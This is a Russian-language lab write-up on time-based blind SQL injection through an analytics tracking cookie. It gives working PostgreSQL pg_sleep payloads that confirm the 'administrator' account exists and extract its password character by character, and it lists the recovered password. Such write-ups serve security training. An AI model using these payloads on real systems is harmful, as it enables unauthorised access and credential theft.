Лабораторная работа содержит уязвимость, связанную со слепым внедрением SQL. Приложение использует файл cookie отслеживания для аналитики и выполняет запрос SQL, содержащий значение отправленного файла cookie.

## Дано

База данных содержит таблицу с именем `users`, со столбцами, называемыми `username` и `password`.

## Задача

зайти под administartor

# Разведка

 - тригеров на ' не обнаружено
 - пробуем задержку 
	 `'; IF (1=1) WAITFOR DELAY '0:0:10'--` - не сработало
	 `; SELECT CASE WHEN (1=1) THEN pg_sleep(2) ELSE pg_sleep(0) END--` - сработала бд PostgreSQL


# Атака 

`; SELECT CASE WHEN (1=1) THEN pg_sleep(2) ELSE pg_sleep(0) END--` 
- Формируем
```
';SELECT CASE WHEN (username='administrator') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--
```
Существует такой ник

PostgreSQL - SUBSTRING('foobar', 4, 2)
```
';SELECT CASE WHEN (username='administrator' AND SUBSTRING(password, 1,1)='a') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--
```

clrutcz2vkb0vdi6qjjr

| 1   | c   |
| --- | --- |
| 2   | l   |
| 3   | r   |
| 4   | u   |
| 5   | t   |
| 6   | c   |
| 7   | z   |
| 8   | 2   |
| 9   | v   |
| 10  | k   |
| 11  | b   |
| 12  | 0   |
| 13  | v   |
| 14  | d   |
| 15  | i   |
| 16  | 6   |
| 17  | q   |
| 18  | j   |
| 19  | j   |
| 20  | r   |
